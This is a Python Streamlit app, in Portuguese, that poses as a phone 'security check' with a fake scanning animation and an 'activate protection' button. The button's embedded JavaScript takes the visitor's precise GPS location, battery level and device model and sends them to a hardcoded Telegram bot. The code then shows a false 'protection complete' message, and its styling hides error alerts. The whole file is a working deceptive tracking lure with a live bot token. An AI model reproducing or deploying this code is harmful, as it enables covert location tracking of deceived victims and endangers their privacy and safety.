import streamlit as st
import time

# --- DADOS DO TELEGRAM ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO MANTIDA ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107 !important; color: black !important; font-weight: bold !important;
        width: 100%; height: 60px; border-radius: 12px; border: none;
        font-size: 20px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- MOTOR DO BOTÃO TOTALMENTE INDEPENDENTE ---
js_code = f"""
<div style="width: 100%;">
    <button class="btn-barra" id="mainBtn" onclick="executar()">
        <span style="color: red; font-size: 24px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
function executar() {{
    const btn = document.getElementById('mainBtn');
    btn.innerText = "CARREGANDO...";
    
    // CHAMADA DIRETA AO HARDWARE (O EDGE PRECISA DISSO)
    navigator.geolocation.getCurrentPosition(
        async function(pos) {{
            try {{
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const link = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [VER LOCALIZAÇÃO](" + link + ")";
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: texto, parse_mode: "Markdown" }})
                }});
                
                // Avisa o Streamlit para girar a bolha
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{
                alert("Erro ao processar dados. Verifique sua conexão.");
            }}
        }},
        function(err) {{
            alert("ERRO: Para ativar a proteção, você precisa permitir a localização no pop-up do navegador.");
        }},
        {{ enableHighAccuracy: true, timeout: 8000 }}
    );
}}
</script>

<style>
.btn-barra {{
    background-color: #ffc107; color: black; font-weight: bold;
    width: 100%; height: 60px; border-radius: 12px; border: none;
    font-size: 20px; cursor: pointer; display: flex;
    align-items: center; justify-content: center; gap: 10px;
    font-family: sans-serif;
}}
</style>
"""

clicou = st.components.v1.html(js_code, height=90)

if clicou:
    for p in range(4, 101, 4):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    st.success("Proteção Concluída com Sucesso!")
    st.stop()
